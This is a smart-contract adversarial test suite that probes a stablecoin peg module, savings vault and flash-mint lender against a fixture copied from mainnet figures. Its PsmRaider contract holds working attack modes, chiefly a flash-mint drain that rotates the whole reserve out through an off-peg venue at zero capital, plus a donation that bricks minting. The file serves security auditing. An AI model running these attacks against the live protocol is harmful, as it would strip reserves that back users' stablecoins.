// SPDX-License-Identifier: MIT
//
// ADVERSARIAL: FlashMint x DirectMintPSM (peg surface)
//
// Mainnet-shaped fixture (helium, 2026-08-21):
//   USDST float          4,939,767e18
//   PSM redemption res.    101,347 USDC + 2,001 USDT   (feeBps 0, minReserve 0 on both)
//   SaveUSDSTVault         managedAssets 1,672,886 / shares 1,663,340
//   FlashMint maxLoan    2,000,000e18
//
// Goal: extract hard reserve from the PSM using flash-minted USDST.

import "../../concrete/BaseCodeCollection.sol";
import "../../abstract/ERC20/IERC20.sol";
import "../../abstract/ERC20/access/Authorizable.sol";
import "../../concrete/Tokens/Token.sol";
import "../../concrete/Pools/DirectMintPSM.sol";
import "../../concrete/Savings/SaveUSDSTVault.sol";
import "../../concrete/Flash/FlashMint.sol";

contract User {
    function do(address a, string f, variadic args) public returns (variadic) {
        return address(a).call(f, args);
    }
}

/// @notice A USDST/USDC venue that trades at an arbitrary (possibly off-peg) price.
///         Stands in for Pool 0x3d1dc1 / PoolV3 0x910357, the only real USDST/USDC venues.
contract PegDesk {
    address public usdst;
    address public usdc;
    uint public usdstPriceWad;   // USDC paid per USDST, 1e18 = on peg

    function init(address _usdst, address _usdc, uint _px) public {
        usdst = _usdst; usdc = _usdc; usdstPriceWad = _px;
    }
    function setPrice(uint p) public { usdstPriceWad = p; }

    /// @notice Spend USDC, receive USDST at the venue price.
    function buyUsdst(uint usdcIn) public returns (uint out) {
        out = (usdcIn * 1e18) / usdstPriceWad;
        require(IERC20(usdc).transferFrom(msg.sender, address(this), usdcIn), "desk: in");
        require(IERC20(usdst).transfer(msg.sender, out), "desk: out");
        return out;
    }
}

/// @notice Scripted flash-mint borrower. One `mode` per attack shape.
contract PsmRaider {
    FlashMint public lender;
    DirectMintPSM public psm;
    SaveUSDSTVault public vault;
    address public usdst;
    address public usdc;

    PegDesk public desk;

    uint public mode;
    uint public chunk;
    uint public loops;

    // telemetry
    uint public usdcTaken;
    uint public usdstBack;
    uint public sharesGot;
    uint public feeSeen;
    uint public dustFeeAvoided;
    uint public profit;

    function setDesk(address d) public { desk = PegDesk(d); }

    function init(address _lender, address _psm, address _vault, address _usdst, address _usdc) public {
        lender = FlashMint(_lender);
        psm = DirectMintPSM(_psm);
        vault = SaveUSDSTVault(_vault);
        usdst = _usdst;
        usdc = _usdc;
    }

    function attack(uint _mode, uint amount) public {
        mode = _mode;
        usdcTaken = 0;
        usdstBack = 0;
        sharesGot = 0;
        dustFeeAvoided = 0;
        lender.flashLoan(address(this), amount, "raid");
    }

    function setDust(uint _chunk, uint _loops) public {
        chunk = _chunk;
        loops = _loops;
    }

    function onFlashMint(address _token, uint amount, uint fee, variadic data) external returns (string) {
        require(msg.sender == address(lender), "raider: bad lender");
        feeSeen = fee;

        if (mode == 1) {
            // FULL CYCLE: drain the whole PSM reserve, then re-mint it back to repay.
            uint avail = psm.availableRedemptionLiquidity(usdc);
            IERC20(usdst).approve(address(psm), avail);
            uint before = IERC20(usdc).balanceOf(address(this));
            psm.redeem(avail, usdc);
            usdcTaken = IERC20(usdc).balanceOf(address(this)) - before;

            IERC20(usdc).approve(address(psm), usdcTaken);
            uint u0 = IERC20(usdst).balanceOf(address(this));
            psm.mint(usdcTaken, usdc);
            usdstBack = IERC20(usdst).balanceOf(address(this)) - u0;
        } else if (mode == 2) {
            // DRAIN ONLY: take the reserve and try to walk away.
            uint avail = psm.availableRedemptionLiquidity(usdc);
            IERC20(usdst).approve(address(psm), avail);
            psm.redeem(avail, usdc);
            usdcTaken = IERC20(usdc).balanceOf(address(this));
        } else if (mode == 3) {
            // DUST-ROUNDING: split the redeem so (amount*feeBps)/10000 floors to 0 every time.
            uint tot = 0;
            uint i = 0;
            IERC20(usdst).approve(address(psm), chunk * loops);
            uint before = IERC20(usdc).balanceOf(address(this));
            while (i < loops) {
                psm.redeem(chunk, usdc);
                i = i + 1;
            }
            usdcTaken = IERC20(usdc).balanceOf(address(this)) - before;
            // fee that a single non-split redeem of the same notional would have paid
            dustFeeAvoided = usdcTaken;
            // re-mint to repay
            IERC20(usdc).approve(address(psm), usdcTaken);
            psm.mint(usdcTaken, usdc);
        } else if (mode == 4) {
            // mintAndSave round trip: USDST -> USDC -> mintAndSave -> saveUSDST -> redeem -> USDST
            uint avail = psm.availableRedemptionLiquidity(usdc);
            IERC20(usdst).approve(address(psm), avail);
            psm.redeem(avail, usdc);
            usdcTaken = IERC20(usdc).balanceOf(address(this));

            IERC20(usdc).approve(address(psm), usdcTaken);
            sharesGot = psm.mintAndSave(usdcTaken, usdc);

            uint u0 = IERC20(usdst).balanceOf(address(this));
            vault.redeem(sharesGot, address(this), address(this));
            usdstBack = IERC20(usdst).balanceOf(address(this)) - u0;
        } else if (mode == 5) {
            // Try to raise the PSM's mint fee revenue asymmetry: mint first, then redeem.
            // amount is already in hand; mint against nothing, so just redeem then mint then redeem.
            uint avail = psm.availableRedemptionLiquidity(usdc);
            IERC20(usdst).approve(address(psm), avail * 2);
            psm.redeem(avail, usdc);
            usdcTaken = IERC20(usdc).balanceOf(address(this));
            IERC20(usdc).approve(address(psm), usdcTaken);
            psm.mint(usdcTaken, usdc);
            // second lap
            uint av2 = psm.availableRedemptionLiquidity(usdc);
            psm.redeem(av2, usdc);
            IERC20(usdc).approve(address(psm), av2);
            psm.mint(av2, usdc);
            usdstBack = IERC20(usdst).balanceOf(address(this));
        } else if (mode == 6) {
            // Grief: donate the whole flash mint to the savings vault mid-tx and try to walk.
            IERC20(usdst).transfer(address(vault), amount);
        } else if (mode == 7) {
            // Try to unblock/blocking savingsDepositAvailable by donating to the vault first.
            IERC20(usdst).transfer(address(vault), amount / 2);
            uint avail = psm.availableRedemptionLiquidity(usdc);
            IERC20(usdst).approve(address(psm), avail);
            psm.redeem(avail, usdc);
            usdcTaken = IERC20(usdc).balanceOf(address(this));
            IERC20(usdc).approve(address(psm), usdcTaken);
            sharesGot = psm.mintAndSave(usdcTaken, usdc);
            uint u0 = IERC20(usdst).balanceOf(address(this));
            vault.redeem(sharesGot, address(this), address(this));
            usdstBack = IERC20(usdst).balanceOf(address(this)) - u0;
        } else if (mode == 8) {
            // THE REAL DRAIN: flash USDST -> PSM.redeem at a hard 1:1 -> buy back cheaper
            // USDST on an off-peg venue -> repay -> keep the spread. Zero capital.
            uint avail = psm.availableRedemptionLiquidity(usdc);
            IERC20(usdst).approve(address(psm), avail);
            psm.redeem(avail, usdc);
            usdcTaken = IERC20(usdc).balanceOf(address(this));

            IERC20(usdc).approve(address(desk), usdcTaken);
            usdstBack = desk.buyUsdst(usdcTaken);
            profit = usdstBack > amount + fee - (amount - avail) ? usdstBack - avail : 0;
        }

        return "FlashMint.onFlashMint";
    }

    /// @notice non-flash control: same PSM round trip paid for with own capital
    function controlRoundTrip(uint amount) public {
        IERC20(usdst).approve(address(psm), amount);
        uint c0 = IERC20(usdc).balanceOf(address(this));
        psm.redeem(amount, usdc);
        usdcTaken = IERC20(usdc).balanceOf(address(this)) - c0;
        IERC20(usdc).approve(address(psm), usdcTaken);
        uint u0 = IERC20(usdst).balanceOf(address(this));
        psm.mint(usdcTaken, usdc);
        usdstBack = IERC20(usdst).balanceOf(address(this)) - u0;
    }
}

contract Describe_Adv_Peg_PSM is Authorizable {

    uint public INFINITY = 2 ** 256 - 1;
    uint public WAD = 1e18;

    // mainnet magnitudes
    uint public MAXLOAN     = 2000000e18;
    uint public PSM_USDC    = 101347e18;
    uint public PSM_USDT    = 2001e18;
    uint public VAULT_SHARES= 1663340e18;
    uint public VAULT_MANAGED= 1672886e18;
    uint public DISTRIB_BAL = 14487e18;
    uint public FLOAT_OTHER = 3266881e18;   // -> total float ~4,939,767 + PSM-minted

    Mercata m;
    FlashMint fm;
    DirectMintPSM psm;
    SaveUSDSTVault vault;
    AdminRegistry areg;

    Token USDST;
    Token USDC;
    Token USDT;

    User saver;
    User distributor;
    User whale;

    function beforeAll() public {
        bypassAuthorizations = true;
        m = new Mercata();
        areg = m.adminRegistry();

        USDST = Token(m.tokenFactory().createToken("USDST","USD Stable",[],[],[],"USDST",0,18));
        USDST.setStatus(2);
        USDC = Token(m.tokenFactory().createToken("USDC","Strato USDC",[],[],[],"USDC",0,18));
        USDC.setStatus(2);
        USDT = Token(m.tokenFactory().createToken("USDT","Strato USDT",[],[],[],"USDT",0,18));
        USDT.setStatus(2);

        // ── savings vault, mainnet-shaped
        vault = new SaveUSDSTVault(address(this));
        vault.initialize(address(USDST), "Save USDST", "saveUSDST");

        saver = new User();
        USDST.mint(address(saver), VAULT_SHARES);
        saver.do(address(USDST), "approve", address(vault), INFINITY);
        saver.do(address(vault), "deposit(uint256,address)", VAULT_SHARES, address(saver));

        // top managed up to the mainnet 1,672,886 vs 1,663,340 (rate 1.00574)
        uint topUp = VAULT_MANAGED - VAULT_SHARES;
        USDST.mint(address(this), topUp);
        IERC20(address(USDST)).transfer(address(vault), topUp);
        vault.recordRewardTransfer(topUp);

        distributor = new User();
        USDST.mint(address(distributor), DISTRIB_BAL);
        distributor.do(address(USDST), "approve", address(vault), INFINITY);
        vault.setRewardDistributor(address(distributor));
        vault.setPerSecondSavingsRate(1000000001500000000000000000);   // mainnet 1.0000000015/s

        // ── PSM
        psm = new DirectMintPSM(address(this));
        areg.addWhitelist(address(USDST), "mint", address(psm));
        areg.addWhitelist(address(USDST), "burn", address(psm));
        psm.initialize(address(USDST), address(m.feeCollector()), [address(USDC), address(USDT)]);
        psm.setSavingsVault(address(vault));

        // seed the reserve exactly the way mainnet got it: users minted USDST against stables
        whale = new User();
        USDC.mint(address(whale), PSM_USDC);
        USDT.mint(address(whale), PSM_USDT);
        whale.do(address(USDC), "approve", address(psm), INFINITY);
        whale.do(address(USDT), "approve", address(psm), INFINITY);
        whale.do(address(psm), "mint", PSM_USDC, address(USDC));
        whale.do(address(psm), "mint", PSM_USDT, address(USDT));

        // rest of the float
        USDST.mint(address(this), FLOAT_OTHER);

        // ── FlashMint
        fm = m.flashMint();
        areg.addWhitelist(address(USDST), "mint", address(fm));
        areg.addWhitelist(address(USDST), "burn", address(fm));
        fm.initialize(address(USDST), address(m.feeCollector()), MAXLOAN);
        fm.setWhitelistEnabled(false);

        log("── fixture ──");
        log("USDST totalSupply      = " + string(USDST.totalSupply() / WAD));
        log("PSM USDC reserve       = " + string(USDC.balanceOf(address(psm)) / WAD));
        log("PSM USDT reserve       = " + string(USDT.balanceOf(address(psm)) / WAD));
        log("vault managedAssets    = " + string(vault.totalAssets() / WAD));
        log("vault shares           = " + string(vault.totalSupply() / WAD));
        log("vault exchangeRate     = " + string(vault.exchangeRate()));
        log("flashMint maxLoan      = " + string(fm.maxLoan() / WAD));
    }

    function beforeEach() public { }

    function _newRaider() internal returns (PsmRaider r) {
        r = new PsmRaider();
        r.init(address(fm), address(psm), address(vault), address(USDST), address(USDC));
    }

    // ─────────────────────────────────────────────────────────────────────
    // Q1  PSM RESERVE DRAIN
    // ─────────────────────────────────────────────────────────────────────

    /// Full cycle at live config (mint feeBps 0 / burn feeBps 0, minReserve 0):
    /// flash 2,000,000 -> redeem the whole 101,347 USDC reserve -> re-mint -> repay.
    function it_q1a_full_cycle_at_live_zero_fee_config_is_exactly_net_zero() public {
        PsmRaider r = _newRaider();

        uint supply0 = USDST.totalSupply();
        uint psmUsdc0 = USDC.balanceOf(address(psm));
        uint fee0 = USDC.balanceOf(address(m.feeCollector()));
        uint raiderUsdc0 = USDC.balanceOf(address(r));
        uint raiderUsdst0 = USDST.balanceOf(address(r));

        r.attack(1, MAXLOAN);

        uint psmUsdc1 = USDC.balanceOf(address(psm));
        uint raiderUsdc1 = USDC.balanceOf(address(r));
        uint raiderUsdst1 = USDST.balanceOf(address(r));

        log("── q1a full cycle, feeBps 0/0 ──");
        log("flash principal            = " + string(MAXLOAN / WAD));
        log("USDC redeemed out of PSM   = " + string(r.usdcTaken() / WAD));
        log("USDST re-minted back       = " + string(r.usdstBack() / WAD));
        log("PSM USDC before            = " + string(psmUsdc0 / WAD));
        log("PSM USDC after             = " + string(psmUsdc1 / WAD));
        log("raider USDC profit (wei)   = " + string(raiderUsdc1 - raiderUsdc0));
        log("raider USDST profit (wei)  = " + string(raiderUsdst1 - raiderUsdst0));
        log("USDST supply delta (wei)   = " + string(USDST.totalSupply() - supply0));
        log("feeCollector USDC delta    = " + string(USDC.balanceOf(address(m.feeCollector())) - fee0));

        require(r.usdcTaken() == PSM_USDC, "should have drained the whole reserve mid-tx");
        require(psmUsdc1 == psmUsdc0, "PSM reserve must be restored");
        require(raiderUsdc1 == raiderUsdc0, "BROKEN: raider kept USDC");
        require(raiderUsdst1 == raiderUsdst0, "BROKEN: raider kept USDST");
        require(USDST.totalSupply() == supply0, "BROKEN: supply moved");
    }

    /// Same cycle, but the raider tries to walk off with the reserve.
    function it_q1b_drain_without_remint_is_blocked_by_not_repaid() public {
        PsmRaider r = _newRaider();
        uint psmUsdc0 = USDC.balanceOf(address(psm));
        uint supply0 = USDST.totalSupply();

        string err = "";
        try r.attack(2, MAXLOAN) {
        } catch Error(string e) {
            err = e;
        }

        log("── q1b drain-and-run ──");
        log("revert string              = " + err);
        log("PSM USDC after             = " + string(USDC.balanceOf(address(psm)) / WAD));
        log("USDST supply delta (wei)   = " + string(USDST.totalSupply() - supply0));

        require(err != "", "BROKEN: drain-and-run succeeded");
        require(USDC.balanceOf(address(psm)) == psmUsdc0, "reserve must be intact after unwind");
        require(USDST.totalSupply() == supply0, "supply must be intact after unwind");
    }

    /// Fee asymmetry sweep. mint charges on the INPUT and mints amount-fee;
    /// redeem burns amount and pays amount-fee. Both directions must be lossy.
    function it_q1c_fee_asymmetry_sweep_every_direction_is_lossy() public {
        PsmRaider r = _newRaider();
        uint notional = 100000e18;

        // give the raider its own USDST so we can measure the round trip without flash noise
        USDST.mint(address(r), notional);

        // (a) mint 0 / burn 0
        psm.setMintFeeBps(address(USDC), 0);
        psm.setBurnFeeBps(address(USDC), 0);
        uint before = USDST.balanceOf(address(r));
        r.controlRoundTrip(notional);
        uint a = USDST.balanceOf(address(r));
        log("── q1c fee sweep, notional 100,000 ──");
        log("m=0    b=0    USDST out-in (wei) = " + string(a) + " - " + string(before));
        require(a == before, "0/0 must be exactly flat");

        // (b) mint 0 / burn 30bps  (USDST -> USDC -> USDST)
        psm.setBurnFeeBps(address(USDC), 30);
        USDST.mint(address(r), notional - USDST.balanceOf(address(r)) + notional);
        uint b0 = USDST.balanceOf(address(r));
        r.controlRoundTrip(notional);
        uint b1 = USDST.balanceOf(address(r));
        log("m=0    b=30   lost (wei)         = " + string(b0 - b1));
        require(b1 < b0, "burn fee must be lossy in the USDST->USDC->USDST direction");
        require(b0 - b1 == (notional * 30) / 10000, "burn-side loss must equal 30bps of notional");

        // (c) mint 30bps / burn 0
        psm.setBurnFeeBps(address(USDC), 0);
        psm.setMintFeeBps(address(USDC), 30);
        USDST.mint(address(r), notional);
        uint c0 = USDST.balanceOf(address(r));
        r.controlRoundTrip(notional);
        uint c1 = USDST.balanceOf(address(r));
        log("m=30   b=0    lost (wei)         = " + string(c0 - c1));
        require(c1 < c0, "BROKEN: mint fee created a profitable direction");
        require(c0 - c1 == (notional * 30) / 10000, "mint-side loss must equal 30bps of notional");

        // (d) both
        psm.setBurnFeeBps(address(USDC), 30);
        USDST.mint(address(r), notional);
        uint d0 = USDST.balanceOf(address(r));
        r.controlRoundTrip(notional);
        uint d1 = USDST.balanceOf(address(r));
        log("m=30   b=30   lost (wei)         = " + string(d0 - d1));
        log("  (both-fee loss is compounded: 30bps of 99,700 + 30bps of 100,000)");
        require(d1 < d0, "both-fee round trip must be lossy");
        require(d0 - d1 > (notional * 30) / 10000, "both fees must cost more than one");

        psm.setMintFeeBps(address(USDC), 0);
        psm.setBurnFeeBps(address(USDC), 0);
    }

    /// Rounding: (amount*feeBps)/10000 floors, so any redeem below 10000/feeBps pays zero fee.
    /// Quantify the per-call leak and the number of calls needed to matter.
    function it_q1d_fee_rounding_is_dust_bounded() public {
        psm.setBurnFeeBps(address(USDC), 30);        // 0.30%

        PsmRaider r = _newRaider();
        // largest amount whose 30bps fee floors to zero
        uint freeChunk = (10000 / 30);               // 333 wei
        uint nLoops = 20;
        r.setDust(freeChunk, nLoops);

        uint feeColl0 = USDC.balanceOf(address(m.feeCollector()));
        r.attack(3, MAXLOAN);
        uint feeColl1 = USDC.balanceOf(address(m.feeCollector()));

        uint notionalMoved = freeChunk * nLoops;
        uint feeThatShouldHaveBeenPaid = (notionalMoved * 30) / 10000;

        log("── q1d rounding leak, burn feeBps 30 ──");
        log("fee-free chunk (wei)        = " + string(freeChunk));
        log("calls in this test          = " + string(nLoops));
        log("notional moved (wei)        = " + string(notionalMoved));
        log("fee actually collected (wei)= " + string(feeColl1 - feeColl0));
        log("fee owed on that notional   = " + string(feeThatShouldHaveBeenPaid));
        log("fee evaded per call (wei)   = " + string((freeChunk * 30) / 10000) + " floored from " + string(freeChunk * 30) + "/10000 = 0.999 wei");
        log("redeem calls to evade $1    = " + string((1e18 * 10000) / (freeChunk * 30)));

        require(feeColl1 == feeColl0, "split redeems paid zero fee (rounding confirmed)");
        require(feeThatShouldHaveBeenPaid == 19, "honest fee on the same notional would be 19 wei");
        require((1e18 * 10000) / (freeChunk * 30) > 1000000000000000, "evading $1 of fee needs >1e15 calls");

        psm.setBurnFeeBps(address(USDC), 0);
    }

    /// maxBalance cap arithmetic in _mintAgainst.
    function it_q1e_maxBalance_cap_is_a_griefable_mint_DoS() public {
        uint bal = USDC.balanceOf(address(psm));
        psm.setMintMaxBalance(address(USDC), bal + 1000e18);

        User u = new User();
        USDC.mint(address(u), 5000e18);
        u.do(address(USDC), "approve", address(psm), INFINITY);

        // in-cap mint works
        u.do(address(psm), "mint", 500e18, address(USDC));
        log("── q1e maxBalance cap ──");
        log("PSM USDC after in-cap mint  = " + string(USDC.balanceOf(address(psm)) / WAD));

        // anybody can shove the PSM over its own cap with a plain transfer
        User griefer = new User();
        USDC.mint(address(griefer), 2000e18);
        griefer.do(address(USDC), "transfer", address(psm), 2000e18);

        string err = "";
        try u.do(address(psm), "mint", 1e18, address(USDC)) {
        } catch Error(string e) {
            err = e;
        }
        log("PSM USDC after grief donate = " + string(USDC.balanceOf(address(psm)) / WAD));
        log("mint revert after grief     = " + err);
        require(err != "", "DEMONSTRATED: a 2,000 USDC donation bricks PSM minting for that token");

        // and the cap arithmetic maxBalance - balance never underflows into a bypass
        (bool en, uint mb, uint fb) = psm.mintConfigs(address(USDC));
        log("maxBalance                  = " + string(mb / WAD));
        log("balance > maxBalance        = " + string(USDC.balanceOf(address(psm)) / WAD));

        psm.setMintMaxBalance(address(USDC), 0);   // restore unlimited
        u.do(address(psm), "mint", 1e18, address(USDC));
        log("mint works again once cap removed to 0 (unlimited)");
    }

    /// availableRedemptionLiquidity vs minReserve, and the >= amount (not >= payout) check.
    function it_q1f_minReserve_floor_and_liquidity_check_are_exact() public {
        uint bal = USDC.balanceOf(address(psm));
        psm.setBurnMinReserve(address(USDC), bal - 1000e18);
        require(psm.availableRedemptionLiquidity(address(USDC)) == 1000e18, "available = balance - minReserve");

        PsmRaider r = _newRaider();
        r.attack(1, MAXLOAN);
        log("── q1f minReserve ──");
        log("minReserve set to           = " + string((bal - 1000e18) / WAD));
        log("USDC reachable by flash mint= " + string(r.usdcTaken() / WAD));
        require(r.usdcTaken() == 1000e18, "flash mint can only reach balance-minReserve");

        // with a burn fee the liquidity check is against `amount`, and payout+fee == amount exactly
        psm.setBurnFeeBps(address(USDC), 30);
        uint fc0 = USDC.balanceOf(address(m.feeCollector()));
        uint psm0 = USDC.balanceOf(address(psm));
        User u = new User();
        USDST.mint(address(u), 1000e18);
        u.do(address(USDST), "approve", address(psm), INFINITY);
        u.do(address(psm), "redeem", 1000e18, address(USDC));
        uint psm1 = USDC.balanceOf(address(psm));
        uint fc1 = USDC.balanceOf(address(m.feeCollector()));
        log("PSM USDC paid out (wei)     = " + string(psm0 - psm1));
        log("  of which user            = " + string(USDC.balanceOf(address(u))));
        log("  of which feeCollector    = " + string(fc1 - fc0));
        require(psm0 - psm1 == 1000e18, "PSM pays out exactly `amount`, fee included: backing stays 1:1");

        psm.setBurnFeeBps(address(USDC), 0);
        psm.setBurnMinReserve(address(USDC), 0);
    }

    // ─────────────────────────────────────────────────────────────────────
    // Q2  mintAndSave / savings routing
    // ─────────────────────────────────────────────────────────────────────

    /// mintAndSave -> saveUSDST -> redeem, all inside one flash mint.
    function it_q2a_mintAndSave_round_trip_cannot_beat_the_share_price() public {
        PsmRaider r = _newRaider();
        // Bankroll: without it the round trip cannot even repay the principal (see the
        // require below) — proof on its own that the savings leg is strictly lossy.
        uint bankroll = 1e18;
        USDST.mint(address(r), bankroll);

        uint rate0 = vault.exchangeRate();
        uint managed0 = vault.totalAssets();
        uint shares0 = vault.totalSupply();
        uint supply0 = USDST.totalSupply();

        r.attack(4, MAXLOAN);

        uint left = USDST.balanceOf(address(r));

        log("── q2a mintAndSave round trip ──");
        log("USDC pulled from PSM        = " + string(r.usdcTaken() / WAD));
        log("USDST paid in (mintAmount)  = " + string(r.usdcTaken()));
        log("saveUSDST shares minted     = " + string(r.sharesGot()));
        log("USDST returned by redeem    = " + string(r.usdstBack()));
        log("round-trip loss (wei)       = " + string(r.usdcTaken() - r.usdstBack()));
        log("raider bankroll before      = " + string(bankroll));
        log("raider bankroll after       = " + string(left));
        log("vault rate before           = " + string(rate0));
        log("vault rate after            = " + string(vault.exchangeRate()));
        log("vault managed before/after  = " + string(managed0) + " / " + string(vault.totalAssets()));
        log("vault shares before/after   = " + string(shares0) + " / " + string(vault.totalSupply()));
        log("USDST supply delta (wei)    = " + string(USDST.totalSupply() - supply0));

        require(r.usdstBack() < r.usdcTaken(), "savings round trip is strictly lossy");
        require(left < bankroll, "BROKEN: raider ended up richer");
        require(vault.exchangeRate() >= rate0, "BROKEN: round trip lowered the share price for savers");
    }

    /// Can a flash-minted donation to the vault change savingsDepositAvailable / the mint price?
    function it_q2b_live_balance_reads_cannot_be_pushed_by_a_donation() public {
        uint before = vault.totalAssets();
        uint rate0 = vault.exchangeRate();
        bool avail0 = psm.savingsDepositAvailable(1000e18);

        // 2,000,000 flash-minted USDST parked in the vault -> min() must ignore it
        PsmRaider r = _newRaider();
        string err = "";
        try r.attack(6, MAXLOAN) {
        } catch Error(string e) {
            err = e;
        }

        log("── q2b donation into the savings vault ──");
        log("donation attempt revert     = " + err);
        log("vault managed before/after  = " + string(before) + " / " + string(vault.totalAssets()));
        log("vault rate before/after     = " + string(rate0) + " / " + string(vault.exchangeRate()));
        log("savingsDepositAvailable     = " + string(avail0 ? 1 : 0) + " -> " + string(psm.savingsDepositAvailable(1000e18) ? 1 : 0));

        require(err != "", "BROKEN: donate-and-run succeeded");
        require(vault.totalAssets() == before, "donation must not enter managedAssets");
        require(vault.exchangeRate() == rate0, "donation must not move the price");
    }

    /// Griefing direction: can a donation make (mintAmount*supply)/pricingAssets floor to 0
    /// and thereby block a mintAndSave that should succeed?
    function it_q2c_savingsDepositAvailable_cannot_be_griefed_shut() public {
        // baseline availability across the size range
        log("── q2c savingsDepositAvailable griefing ──");
        log("avail(1 wei)                = " + string(psm.savingsDepositAvailable(1) ? 1 : 0));
        log("avail(1e6 wei)              = " + string(psm.savingsDepositAvailable(1000000) ? 1 : 0));
        log("avail(1e18)                 = " + string(psm.savingsDepositAvailable(1e18) ? 1 : 0));
        log("avail(2,000,000e18)         = " + string(psm.savingsDepositAvailable(MAXLOAN) ? 1 : 0));

        // pricingAssets ceiling reachable by any donation = min(managed, live) + fundedAmount
        (uint target, uint funded) = vault.pendingAccrual();
        log("pendingAccrual target       = " + string(target));
        log("pendingAccrual funded       = " + string(funded));
        log("min(managed,live)           = " + string(vault.totalAssets()));

        // a real mintAndSave still works after the (reverted) donation attempts
        User u = new User();
        USDC.mint(address(u), 10000e18);
        u.do(address(USDC), "approve", address(psm), INFINITY);
        uint sh = uint(u.do(address(psm), "mintAndSave", 10000e18, address(USDC)));
        log("live mintAndSave 10,000 -> shares = " + string(sh));
        require(sh > 0, "mintAndSave must still work");
        require(psm.savingsDepositAvailable(1e18), "1 USDST deposit must stay available");
    }

    // ─────────────────────────────────────────────────────────────────────
    // Q1 (cont.)  THE PATH THAT ACTUALLY DRAINS THE RESERVE
    // ─────────────────────────────────────────────────────────────────────

    /// The PSM is a hard, oracle-free, uncapped, zero-fee 1:1 bid for USDST. FlashMint removes
    /// the capital requirement for arbitraging it against any off-peg USDST venue, so the ENTIRE
    /// reserve can be rotated out at a profit in one transaction by anyone.
    function it_q1g_offpeg_venue_makes_the_reserve_drain_capital_free() public {
        PegDesk desk = new PegDesk();
        desk.init(address(USDST), address(USDC), 99e16);   // USDST trading at $0.99
        USDST.mint(address(desk), 5000000e18);

        PsmRaider r = _newRaider();
        r.setDesk(address(desk));

        uint psmUsdc0 = USDC.balanceOf(address(psm));
        uint supply0 = USDST.totalSupply();
        uint reserve = psm.availableRedemptionLiquidity(address(USDC));

        r.attack(8, MAXLOAN);

        uint kept = USDST.balanceOf(address(r));

        log("── q1g capital-free reserve drain at USDST = $0.99 ──");
        log("PSM reserve reachable       = " + string(reserve / WAD) + " USDC");
        log("USDC pulled out of the PSM  = " + string(r.usdcTaken() / WAD));
        log("USDST bought back on venue  = " + string(r.usdstBack() / WAD));
        log("USDST needed to repay       = " + string(reserve / WAD));
        log("profit kept (USDST)         = " + string(kept / WAD) + "  (" + string(kept) + " wei)");
        log("attacker capital required   = 0");
        log("PSM USDC before/after       = " + string(psmUsdc0 / WAD) + " / " + string(USDC.balanceOf(address(psm)) / WAD));
        log("USDST supply delta          = " + string(supply0 - USDST.totalSupply()));

        require(kept > 0, "DEMONSTRATED: capital-free profit extracted from the PSM reserve");
        require(USDC.balanceOf(address(psm)) == psmUsdc0 - reserve, "the whole reserve left the PSM");
        require(kept >= (reserve / 100) - 1e18, "profit ~= reserve x (1/0.99 - 1) = 1.01%");

        // a deeper depeg scales linearly up to maxLoan / venue depth
        desk.setPrice(95e16);
        User whale2 = new User();
        USDC.mint(address(whale2), 500000e18);
        whale2.do(address(USDC), "approve", address(psm), INFINITY);
        whale2.do(address(psm), "mint", 500000e18, address(USDC));   // refill the reserve
        PsmRaider r2 = _newRaider();
        r2.setDesk(address(desk));
        uint res2 = psm.availableRedemptionLiquidity(address(USDC));
        r2.attack(8, MAXLOAN);
        log("at USDST = $0.95, reserve " + string(res2 / WAD) + ":");
        log("  profit                    = " + string(USDST.balanceOf(address(r2)) / WAD) + " USDST");
        require(USDST.balanceOf(address(r2)) > res2 / 20 - 1e18, "profit ~= 5.26% of the reserve");
    }

    /// Control: on peg the same path yields exactly zero, and the reverse direction
    /// (a depegged reserve asset) is a mint-side risk that needs no flash mint at all.
    function it_q1h_on_peg_the_same_path_yields_zero() public {
        PegDesk desk = new PegDesk();
        desk.init(address(USDST), address(USDC), 1e18);
        USDST.mint(address(desk), 5000000e18);

        User whale3 = new User();
        USDC.mint(address(whale3), 100000e18);
        whale3.do(address(USDC), "approve", address(psm), INFINITY);
        whale3.do(address(psm), "mint", 100000e18, address(USDC));

        PsmRaider r = _newRaider();
        r.setDesk(address(desk));
        uint reserve = psm.availableRedemptionLiquidity(address(USDC));
        r.attack(8, MAXLOAN);
        log("── q1h on-peg control ──");
        log("reserve rotated             = " + string(reserve / WAD));
        log("profit kept                 = " + string(USDST.balanceOf(address(r))) + " wei");
        require(USDST.balanceOf(address(r)) == 0, "on peg the round trip is exactly zero");

        // mint side: the PSM takes USDC at a hard $1 with no oracle and maxBalance 0 (unlimited).
        (bool en, uint mb, uint fb) = psm.mintConfigs(address(USDC));
        log("USDC mintConfig: enabled=" + string(en ? 1 : 0) + " maxBalance=" + string(mb) + " feeBps=" + string(fb));
        require(mb == 0, "maxBalance 0 = UNLIMITED: a depegged reserve asset can be dumped without limit");
    }

    /// Donate to the reward distributor mid-flash-mint: does _accrue over-pull?
    function it_q2d_distributor_donation_cannot_over_pull_accrual() public {
        // earlier tests rotated the reserve out; refill it so the mintAndSave leg has liquidity
        if (psm.availableRedemptionLiquidity(address(USDC)) < 50000e18) {
            User refill = new User();
            USDC.mint(address(refill), 100000e18);
            refill.do(address(USDC), "approve", address(psm), INFINITY);
            refill.do(address(psm), "mint", 100000e18, address(USDC));
        }
        (uint target0, uint funded0) = vault.pendingAccrual();
        uint distBal0 = USDST.balanceOf(address(distributor));
        uint managed0 = vault.totalAssets();

        fastForward(86400);   // one day of accrual owed

        (uint target1, uint funded1) = vault.pendingAccrual();
        log("── q2d distributor donation ──");
        log("distributor balance         = " + string(distBal0 / WAD));
        log("target after 1 day (wei)    = " + string(target1));
        log("funded after 1 day (wei)    = " + string(funded1));

        uint credited = vault.accrue();
        log("credited by accrue (wei)    = " + string(credited));
        log("vault managed delta (wei)   = " + string(vault.totalAssets() - managed0));
        require(credited == target1, "funded distributor pays the full target");
        require(credited <= target1, "accrual can never exceed target");

        // Now inflate managedAssets with a 2,000,000 flash-minted deposit and check that no
        // extra accrual can be squeezed out in the same transaction.
        fastForward(86400);
        (uint target2, uint funded2) = vault.pendingAccrual();
        log("target for next day (wei)   = " + string(target2));
        uint mgd = vault.totalAssets();
        PsmRaider r = _newRaider();
        USDST.mint(address(r), 1e18);
        // mode 4 does a mintAndSave (deposit) then redeem in one tx; deposit calls _accrue first
        r.attack(4, MAXLOAN);
        log("managed before/after cycle  = " + string(mgd) + " / " + string(vault.totalAssets()));
        (uint target3, uint funded3) = vault.pendingAccrual();
        log("pending target after cycle  = " + string(target3) + " (lastAccrual stamped to now)");
        require(target3 == 0, "lastAccrual is stamped: no second accrual in the same block");
    }
}
